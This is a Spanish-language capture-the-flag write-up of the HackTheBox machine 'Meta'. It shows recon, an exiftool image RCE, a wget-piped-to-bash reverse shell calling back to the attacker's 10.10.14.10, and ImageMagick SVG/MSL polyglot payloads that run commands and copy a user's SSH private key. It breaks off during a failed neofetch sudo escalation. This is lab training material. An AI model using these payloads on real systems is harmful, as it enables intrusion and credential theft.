---
title: Meta WriteUp
date: 2023-05-17
categories: [WriteUps, Máquinas Linux]
tags: [Reverse Shell, sudo]
image:
  path: ../../assets/img/writeups/Meta/meta.jpg
  width: 528
  height: 340
  alt: Banner Meta
---

Hoy hacemos la máquina **Meta** con IP **10.10.11.140**. Tiene los puertos 22/ssh y 80/http abiertos. Realizamos un fuzzing de subdominios y encontramos uno, hay una utilidad que te da los metadatos de la imagen que subas. Pensamos que podría estar exiftool operando por detrás y buscamos vulnerabilidades, una de ellas funciona y accedemos a la máquina Meta como el usuario www-data.

Escalada:  
Nos creamos un programa rápido para averiguar las tareas que se ejecutan temporalemente(cada cierto tiempo) encontramos una. Es un programa/herramienta de imageMagick, busco la versión que esta instalada en máquina objetivo y encuentro vulnerabilidad. Escalamos de esta manera al usuario thomas.   
Haciendo un sudo -l vemos que podemos ejecutar el comando neofetch como root, además tenemos control de env_keep que permite mantener las variables de entorno de un usuario en determinadas circunstancias, sudo es una de ellas. Modificamos nuestro archivo config de neofetch añadiendo comando que nos convenga y después realizamos el sudo neofetch.

## Reconocimiento

La caja que vamos a realizar se llama **Meta** con IP **10.10.11.140**. Después de conectarnos a la VPN de HackTheBox y activar la máquina vemos si tenemos conectividad con ella haciendo un ping:
```
❯ ping -c 1 10.10.11.140
PING 10.10.11.140 (10.10.11.140) 56(84) bytes of data.
64 bytes from 10.10.11.140: icmp_seq=1 ttl=63 time=45.4 ms

--- 10.10.11.140 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.421/45.421/45.421/0.000 ms
```
Un paquete enviado, un paquete recibido. Todo bien.

Realizamos un escaneo de puertos:
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.140 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-15 10:45 CEST
Initiating SYN Stealth Scan at 10:45
Scanning 10.10.11.140 [65535 ports]
Discovered open port 80/tcp on 10.10.11.140
Discovered open port 22/tcp on 10.10.11.140
Completed SYN Stealth Scan at 10:45, 11.99s elapsed (65535 total ports)
Nmap scan report for 10.10.11.140
Host is up, received user-set (0.044s latency).
Scanned at 2023-05-15 10:45:00 CEST for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds
           Raw packets sent: 65684 (2.890MB) | Rcvd: 65535 (2.621MB)
```
Las opciones que he utilizado son:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.140 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Nos ha encontrado los puertos 22 y 80, hagamos un escaneo un poco más profundo de estos puertos:
```
❯ nmap -p22,80 -sC -sV 10.10.11.140 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-15 10:48 CEST
Nmap scan report for 10.10.11.140
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.17 seconds
```
* -sC : Lanza unos scrips básicos de reconocimiento.
* -sV : Para averiguar la versión de los servicios.

Tenemos el puerto 22/ssh y el puerto 80/http que por lo visto en la respuesta intenta dirigirse a http://artcorp.htb pero no puede. No puede porque posiblemente sea un virtual hosting y hay que indicar en nuestro **/etc/hosts** que la ip `10.10.11.164` tiene como dominio **artcorp.htb**:
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.140  artcorp.htb
```
Ahora ya podrá redirigirse a ese dominio.

## Buscando vulnerabilidades

Antes de entrar al navegador y visualizar la página web, realizaré un escaneo desde terminal con la herramienta whatweb, que es tipo Wappalyzer(en navegador) pero desde terminal. Estas herramientas se encargan de encontrar las tecnologías que corren detrás de la web.
```
❯ whatweb http://10.10.11.140
http://10.10.11.140 [301 Moved Permanently] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.10.11.140], RedirectLocation[http://artcorp.htb]
http://artcorp.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.140], Title[Home]
```
Primero te redirige al dominio, podemos ver que es un servidor Apache lo que corre por detrás.

Vamos a ver la página desde la web.

![Web]({{ 'assets/img/writeups/Meta/web.png' | relative_url }}){: .center-image }

En la parte de abajo están las opciones about, contact y otras.

Haciendo hovering(pasar el ratón) por los apartados de abajo (about, contact ,etc) no parecen llevar a ningún sitio, dirigen a la página actual.

Poquita cosa la verdad..voy a realizar un fuzzing para buscar subdirectorios con la herramienta wfuzz:
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://artcorp.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://artcorp.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        86 L     266 W      4427 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000000007:   200        86 L     266 W      4427 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                      
000000010:   200        86 L     266 W      4427 Ch     "#"                                                                                                                    
000000002:   200        86 L     266 W      4427 Ch     "#"                                                                                                                    
000000005:   200        86 L     266 W      4427 Ch     "# This work is licensed under the Creative Commons"                                                                   
000000008:   200        86 L     266 W      4427 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                                                           
000000006:   200        86 L     266 W      4427 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                        
000000291:   301        7 L      20 W       234 Ch      "assets"                                                                                                               
000000550:   301        7 L      20 W       231 Ch      "css"                                                                                                                  
000000004:   200        86 L     266 W      4427 Ch     "#"                                                                                                                                                                                                                                     
000000014:   200        86 L     266 W      4427 Ch     "http://artcorp.htb/"                                                                                                  
000000003:   200        86 L     266 W      4427 Ch     "# Copyright 2007 James Fisher"                                                                                        
000045240:   200        86 L     266 W      4427 Ch     "http://artcorp.htb/"                                                                                                  
000095524:   403        7 L      20 W       199 Ch      "server-status"                                                                                                        
000202924:   404        7 L      23 W       196 Ch      "em_download"                                                                                                          
^Z
zsh: suspended  wfuzz -c --hc=404 -t 150 -w  http://artcorp.htb/FUZZ
❯ kill %
```
Encuentra /assets, /css y /server-status pero este con código 403. Miro que hay en esos subdirectorios.  
En las dos primeras no hay directory listing y en la última no tengo permisos para verla.

Haré otro fuzzing esta vez por archivos php y txt:
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://artcorp.htb/FUZZ.FUZ2Z
```
No pongo el resultado porque no encuentra nada.

Ahora buscaré subdirectorios, esta vez con la herramienta **gobuster**.
```
❯ gobuster vhost -u http://artcorp.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 150
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb
[+] Method:       GET
[+] Threads:      150
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/05/15 12:25:14 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
                                                  
===============================================================
2023/05/15 12:26:06 Finished
===============================================================
```
¡Y encontramos un subdirectorio!!, **dev01.artcorp.htb**.  
Lo añado al /etc/hosts:
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.140  artcorp.htb   dev01.artcorp.htb
```
Veamos que hay en este nuevo subdominio.

![Subdominio]({{ 'assets/img/writeups/Meta/subdominio.png' | relative_url }}){: .center-image }

Hay un enlace a metaview. Le doy y parece una aplicación que te muestra los metadatos de la imágen que elijas subir.

![Metaview]({{ 'assets/img/writeups/Meta/metaview.png' | relative_url }}){: .center-image }

Subo una imagen de prueba, le doy a "upload" y el resultado es este:

![Subida]({{ 'assets/img/writeups/Meta/subida.png' | relative_url }}){: .center-image }

Son los metadatos de la imagen. Está página de subida lleva la ruta http://dev01.artcorp.htb/metaview/index.php podría fuzzear de nuevo por esta ruta, subdirectorios y archivos php ya que veo ese index.php. Primero solo subdirectorios:
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://dev01.artcorp.htb/metaview/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev01.artcorp.htb/metaview/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        33 L     83 W       1404 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000000012:   200        33 L     83 W       1404 Ch     "# on at least 2 different hosts"                                                                                                                                       
000000013:   200        33 L     83 W       1404 Ch     "#"                                                                                                                    
000000003:   200        33 L     83 W       1404 Ch     "# Copyright 2007 James Fisher"                                                                                        
000000014:   200        33 L     83 W       1404 Ch     "http://dev01.artcorp.htb/metaview/"                                                                                   
000000164:   301        7 L      20 W       250 Ch      "uploads"                                                                                                                                                                  
000000291:   301        7 L      20 W       249 Ch      "assets"                                                                                                               
000000006:   200        33 L     83 W       1404 Ch     "# Attribution-Share Alike 3.0                                                           
000001481:   301        7 L      20 W       249 Ch      "vendor" 
```
Tenemos tres subdirectorios pero todos con el código 301 y mismas palabras..mala pinta. Miro en el navegador y "Not Found".

Fuzzearé por archivos con extensión php y txt:
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://dev01.artcorp.htb/FUZZ.FUZ2Z
```
Solo encuentra el index.php

¿Qué pasa por detras cuando subo una imagen?. Pasemos la petición de subida por el burpsuite.  
No descubro nada que sepa vulnerable..  
Pero al mostrar los metadatos puedo pensar en que está usando el comando exiftool por detrás. Buscando con google exiftool exploit github encuentro varias opciones. Aquí es ir probando a ver cual funciona, voy a elegir la de OneSecCyber/JPEG.RCE que tiene buena pinta.
```
❯ git clone https://github.com/OneSecCyber/JPEG_RCE.git
Clonando en 'JPEG_RCE'...
remote: Enumerating objects: 46, done.
remote: Counting objects: 100% (46/46), done.
remote: Compressing objects: 100% (43/43), done.
remote: Total 46 (delta 17), reused 0 (delta 0), pack-reused 0
Recibiendo objetos: 100% (46/46), 6.50 MiB | 3.71 MiB/s, listo.
Resolviendo deltas: 100% (17/17), listo.
❯ ls
total 0
drwxr-xr-x 1 root root 80 may 17 10:15 JPEG_RCE
❯ cd JPEG_RCE
❯ ls -la
total 7,1M
drwxr-xr-x 1 root root   80 may 17 10:15 .
drwxr-xr-x 1 root root   16 may 17 10:15 ..
-rw-r--r-- 1 root root  697 may 17 10:15 eval.config
drwxr-xr-x 1 root root  138 may 17 10:15 .git
-rw-r--r-- 1 root root 7,1M may 17 10:15 POC.mp4
-rw-r--r-- 1 root root 1,3K may 17 10:15 README.md
-rw-r--r-- 1 root root  28K may 17 10:15 runme.jpg
```
Ahora siguiendo los pasos que nos da el github elegido lanzamos comando que inserta el comando en la imagen, me mandaré un ping a mi máquina.  
Estaba probando en local cuando me di cuenta de que mi versión de existool no es vulnerable juasss.
```
❯ exiftool -config eval.config runme.jpg -eval='system("ping -c 1 10.10.14.10")'
    1 image files updated
``` 
Me pongo en escucha:
``` 
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
Y ahora subo la imagen a la web. Podemos ver que se ha enviado una petición

![RCE]({{ 'assets/img/writeups/Meta/rce.png' | relative_url }}){: .center-image }

Y en mi terminal se ve la petición recibida:
```
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:33:58.544775 IP 10.10.11.140 > 10.10.14.10: ICMP echo request, id 1034, seq 1, length 64
10:33:58.544813 IP 10.10.14.10 > 10.10.11.140: ICMP echo reply, id 1034, seq 1, length 64
```
Muy bien tengo RCE. Ahora quiero enviarme una reverse shell. Esta vez en lugar de hacerlo con la típica de `bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'` lo haré de otra manera. Primero voy averiguar si hay curl o wget. Curl no hay, pero wget si:
```
❯ exiftool -config eval.config runme.jpg -eval='system("which wget")'
    1 image files updated
```
Subimos la imagen y vemos en el navegador la ruta /usr/bin/wget. Sabiendo que esta wget vamos a mandarnos una solicitud a nuestro ordenador donde tendré alojado un script en bash que me dará una reverse shell. Recuerda importante que curl no hace lo mismo que wget, curl te muestra la información solicitada pero wget te la descarga y no te la representa, para que wget sea como curl tienes que añadir la opción -qO- que sirve para mostrar el código fuente.
```
❯ exiftool -config eval.config runme.jpg -eval='system("wget -qO- 10.10.14.10 | bash")'
    1 image files updated
``` 
Creo el archivo que se descargará la víctima con nombre index.html en mi carpeta local content:
``` bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.10/443 0>&1
``` 
Y en esa misma carpeta me abro un servidor en python3:
```
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Y desde otra ventana me pongo en escucha:
```
❯ nc -nlvp 443
listening on [any] 443 ...
``` 
Ahora es turno de subir la foto con la inyección que le metimos. Lo que hará al interpretar el comando es abrir el código del index.html y luego ejecutarlo con bash.

``` 
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.140] 37182
bash: cannot set terminal process group (638): Inappropriate ioctl for device
bash: no job control in this shell
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ 
```
¡¡¡¡Y recibimos la reverse shell!!!.

## Primera escalada

Tendremos que realizar el tratamiento de la tty:
```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z
zsh: suspended  nc -nlvp 443
```
Sale a mi terminal local. Seguimos con el tratamiento:
```
> stty raw -echo; fg
        reset xterm
``` 
Y volvemos a la máquina objetivo para acabar el tratamiento:
```
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xterm
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export SHELL=bash
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ stty rows 38 columns 184
```
Teniendo ya una tty en condiciones veamos quienes somos y como podemos escalar privilegios:
``` 
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la
total 36
drwxr-xr-x 7 root www-data 4096 Aug 28  2021 .
drwxr-xr-x 4 root root     4096 Oct 18  2021 ..
drwxr-xr-x 2 root www-data 4096 Aug 28  2021 assets
-rw-r--r-- 1 root www-data   72 Aug 28  2021 composer.json
drwxr-xr-x 2 root www-data 4096 Aug 28  2021 css
-rw-r--r-- 1 root www-data 2786 Aug 29  2021 index.php
drwxr-xr-x 2 root www-data 4096 Aug 28  2021 lib
drwxrwxr-x 2 root www-data 4096 May 17 05:03 uploads
drwxr-xr-x 3 root www-data 4096 Aug 28  2021 vendor
www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cd /home
www-data@meta:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug 29  2021 .
drwxr-xr-x 18 root   root   4096 Aug 29  2021 ..
drwxr-xr-x  4 thomas thomas 4096 Jan 17  2022 thomas
www-data@meta:/home$ cd thomas
www-data@meta:/home/thomas$ ls -la
total 32
drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh
-rw-r----- 1 root   thomas   33 May 17 04:09 user.txt
``` 
Soy el usuario www-data y tendremos que escalar al usuario thomas seguramente antes de escalar nuevamente a root. No podemos leer la primera flag(user.txt).

Busquemos vías para subir privilegios:
```
www-data@meta:/$ find / \-perm -4000 2>/dev/null
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign

www-data@meta:/$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
//No tenemos contraseña así que nada.

www-data@meta:/$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
``` 
De momento nada. Esos comandos con suid no son vulnerables que sepa. No tenemos contraseña para saber si tengo permisos sudo, y esa cappability no me ayuda en nada, si hubiera salido la de cap_setuid entonces quizás podríamos hacer algo más en esta parte.

Miro las tareas cron y otras tareas programadas a intervalos regulares de tiempo:
```
www-data@meta:/$ crontab -l 
bash: /usr/bin/crontab: Permission denied
www-data@meta:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@meta:/$ systemctl list-timers
NEXT                         LEFT          LAST                         PASSED       UNIT                         ACTIVATES
Wed 2023-05-17 05:39:00 EDT  26min left    Wed 2023-05-17 05:09:03 EDT  3min 26s ago phpsessionclean.timer        phpsessionclean.service
Wed 2023-05-17 06:47:21 EDT  1h 34min left Wed 2023-05-17 04:09:39 EDT  1h 2min ago  apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2023-05-17 08:47:34 EDT  3h 35min left Wed 2023-05-17 04:09:39 EDT  1h 2min ago  apt-daily.timer              apt-daily.service
Thu 2023-05-18 00:00:00 EDT  18h left      Wed 2023-05-17 04:09:39 EDT  1h 2min ago  logrotate.timer              logrotate.service
Thu 2023-05-18 04:24:40 EDT  23h left      Wed 2023-05-17 04:24:40 EDT  47min ago    systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
```
Nada, la más corta se realiza cada 26 minutos. Es un CTF, no te van hacer esperar 26 minutos para escalar de privilegios.  
¿Y del sistema que sabemos?:
```
www-data@meta:/$ uname -a
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
www-data@meta:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 10 (buster)
Release:	10
Codename:	buster
```
Esto último lo suelo mirar por si el kernel o la versión de linux fueran vulnerables. Suelo fijarme más en el kernel(uname -a), si estuviera entre la versión 2.6 y la 3.9 sería vulnerable a una vuln conocida como dirty cow.

Con los comandos realizados antes de `cat /etc/crontab` o `systemctl list-timers` se ven las tareas cron y otras tareas programadas(temporizadores de systemd), pero no se ven todas. Para ver todas podemos tirar de la herramienta pspy(en github) o nos creamos un script rápido (y lo guardamos para otras ocasiones), lo llamaré procmon, así lo llamo s4vitar y así se queda. Voy a **/dev/shm** donde tendré permisos de escritura y me creo el script:
```
www-data@meta:/dev/shm$ touch procmon.sh
www-data@meta:/dev/shm$ chmod +x procmon.sh
www-data@meta:/dev/shm$ nano procmon.sh
``` 
``` bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n[!] Saliendo....\n"
}
#Ctrl+C
trap ctrl_c INT


old_process=$(ps -eo command)

while true; do

	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\>]" | grep -vE "procmon|command|kworker"
	old_process=$new_process

done
```
Lanzamos el programa:
```
www-data@meta:/dev/shm$ ./procmon.sh
> /usr/sbin/CRON -f
> /usr/sbin/CRON -f
> /usr/sbin/CRON -f
> /usr/sbin/CRON -f
> /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
> /bin/sh -c /usr/local/bin/convert_images.sh
> /bin/bash /usr/local/bin/convert_images.sh
> /usr/sbin/CRON -f
> /bin/sh -c /usr/local/bin/convert_images.sh
> /bin/bash /usr/local/bin/convert_images.sh
^Z
[1]+  Stopped                 ./procmon.sh
www-data@meta:/dev/shm$ kill %

[1]+  Stopped                 ./procmon.sh
```
Se está ejecutando un programa llamado convert_images.sh
```
www-data@meta:/dev/shm$ ls -l /usr/local/bin/convert_images.sh
-rwxr-xr-x 1 root root 126 Jan  3  2022 /usr/local/bin/convert_images.sh
[1]+  Terminated              ./procmon.sh

www-data@meta:/dev/shm$ cat /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```
El archivo es del usuario root, no tenemos permisos de escritura sobre él. Parece que se dirige a la carpeta /var/www/dev01.artcorp.htb/convert_images/  para luego ejecutar sobre ella el comando mogrify, ¿qué es mogrify?. Es una de las herramientas que forman parte de ImageMagick y se utiliza para pasar imágenes a otros formatos(como pdf,word,etc). Me suena que ImageMagick ya lo he tocado alguna vez y que tenía vulnerabilidades.  
Primero miro la versión:
```
www-data@meta:/dev/shm$ mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
```
Muy bien, ahora realizo la siguiente búsqueda por google; **imagemagick 7.0.10 exploit github**. Salen unos cuantos resultados interesantes, me quedaré con el segundo, que dice Shell Inyection via PDF. Dentro de él hay un enlace a un blog, me voy a fiary entro. Leyendo un rato me convence la parte que pone **SVG MSL polyglot file:** e intento hacer lo mismo.

``` 
www-data@meta:/dev/shm$ cd /var/www/dev01.artcorp.htb/convert_images/
www-data@meta:/dev/shm$ touch poc.svg
www-data@meta:/dev/shm$ nano poc.svg
```
Y meto lo siguiente en el poc.svg:
``` 
<image authenticate='ff" `id > /dev/shm/soyyo`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
En la página indican una instrucción; `convert poc.svg loqsea.png` pero no hace falta, convert es un comando/herramienta del propio ImageMagick, al igual que es mogryfy. Esto lo hará por ti el archivo convert_images. Solo hay que pasar el poc.svg al directorio donde se realizan las conversiones(donde se aplica el comando).
```
www-data@meta:/dev/shm$ cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
www-data@meta:/dev/shm$ ls -l
```
Y ahora esperar a que funcione.

Guay!, me sale el soyyo:
```
www-data@meta:/dev/shm$ cat soyyo 
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```
Ahora cambiaré el poc.svg por otro comando que me permita convertirme en thomas. En el directorio thomas he visto el directorio .ssh, posiblemente este la id_rsa dentro. Voy a realizar un cat al id_rsa y enviarlo al directorio /dev/shm. Archivo poc.svg:
```
<image authenticate='ff" `cat /home/thomas/.ssh/id_rsa > /dev/shm/id_rsa1`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```
```
www-data@meta:/dev/shm$ ls -l
total 16
-rw-r--r-- 1 thomas   thomas   2590 May 18 04:26 id_rsa1
-rw-r--r-- 1 www-data www-data  427 May 18 04:24 poc.svg
-rw-r--r-- 1 thomas   thomas     54 May 18 04:14 soyyo
```
Me traigo la id_rsa a mi terminal local y me conecto por ssh como thomas:
```
❯ touch acceso
❯ chmod 600 acceso
❯ nano acceso
\\ Aquí copio la id_rsa
❯ ssh -i acceso thomas@10.10.11.140
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
thomas@meta:~$ whoami
thomas
``` 
Bien!, ya estamos como el usuario thomas y podremos ver la primera flag.
```
thomas@meta:~$ export TERM=xterm
thomas@meta:~$ ls
user.txt
thomas@meta:~$ cat user.txt
3faf3e26117a64849a22025b********
``` 

## Escalada final(root)

Ahora toca intentar escalar al usuario root.
```
thomas@meta:~$ id
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
``` 
Busco en gtfobins y parece ser vulnerable.

![Neofetch]({{ 'assets/img/writeups/Meta/neofetch.png' | relative_url }}){: .center-image }

Peero intentandolo hacer de esa manera no puedo, en cuanto pongo el --config me pide la contraseña para thomas. Así que probaré a hacer lo mismo pero de otra forma. Entiendo que es --config es para añadir a la configuración del neofetch. Con suerte podremos modificar ese archivo de configuración y añadir el comando manualmente.

La ruta de mi config del neofetch es /home/thomas/.config/neofetch/config.conf.  
Añado la linea de `chmod u+s /usr/bin/bash`
```
# See this wiki page for more info:
# https://github.com/dylanaraps/neofetch/wiki/Customizing-Info
chmod u+s /bin/bash
print_info() {
    info title
    info underline

    info "OS" distro
    info "Host" model
    \\ y sigue...
```
Si al ejecutar el `sudo neofetch`root utiliza mi configuración entonces puede que funcione, en cambio, si root usa su propia configuración que tendrá dentro de su directorio home no funcionará:
```
thomas@meta:~/.config/neofetch$ nano config.conf 
thomas@meta:~/.config/neofetch$ sudo neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 14 hours, 52 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 147MiB / 1994MiB 
  `Y$$
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
thomas@meta:~/.config/neofetch$ ls -l /usr/bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash
```
Nada, no ha otorgado el permiso SUID.

